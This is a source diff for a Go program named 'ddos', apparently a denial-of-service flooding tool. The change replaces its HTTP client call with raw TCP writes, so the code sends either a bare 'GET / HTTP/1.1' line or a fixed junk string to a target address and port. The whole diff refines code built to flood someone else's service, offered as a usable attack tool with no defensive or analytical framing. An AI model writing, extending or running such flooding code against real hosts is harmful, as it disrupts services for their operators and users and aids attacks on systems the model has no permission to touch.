@@ -6,7 +6,6 @@ import (
 	"github.com/Streamer272/ddos/options"
 	"io/ioutil"
 	"net"
-	"net/http"
 	"os"
 	"os/signal"
 	"strings"
@@ -14,18 +13,12 @@ import (
 	"time"
 )
 
+const (
+	HttpMessage   = "GET / HTTP/1.1\n"
+	SocketMessage = "abcdefghijklmnopqrstuvwxyz1234567890"
+)
+
 func ddos(opt options.Options) error {
-	// http
-	if opt.Http {
-		_, err := http.Get(opt.Address)
-		if err != nil {
-			return err
-		}
-
-		return nil
-	}
-
-	// socket
 	conn, err := net.Dial("tcp", opt.Address)
 	if err != nil {
 		return err
@@ -34,7 +27,11 @@ func ddos(opt options.Options) error {
 	if opt.Message != "" {
 		message = opt.Message
 	} else {
-		message = "abcdefghijklmnopqrstuvwxyz1234567890"
+		if opt.Http {
+			message = HttpMessage
+		} else {
+			message = SocketMessage
+		}
 	}
 	_, err = fmt.Fprintf(conn, "%v\n", message)
 	if err != nil {
@@ -57,10 +54,6 @@ func main() {
 	if opt.OutputFile != "" && !strings.HasSuffix(opt.OutputFile, ".log") {
 		outputFileSplit := strings.Split(opt.OutputFile, ".")
 		log.Log("WARN", fmt.Sprintf("Recommended extension for output file is .log, has .%v...", outputFileSplit[len(outputFileSplit)-1]), true)
-	}
-	if opt.Http && !strings.HasPrefix(opt.Address, "http") {
-		log.Log("WARN", fmt.Sprintf("%v does not have protocol, using https://", opt.Address), true)
-		opt.Address = "https://" + opt.Address
 	}
 	if !strings.Contains(opt.Address, ":") {
 		log.Log("WARN", fmt.Sprintf("%v does not contain port, using 80...", opt.Address), true)
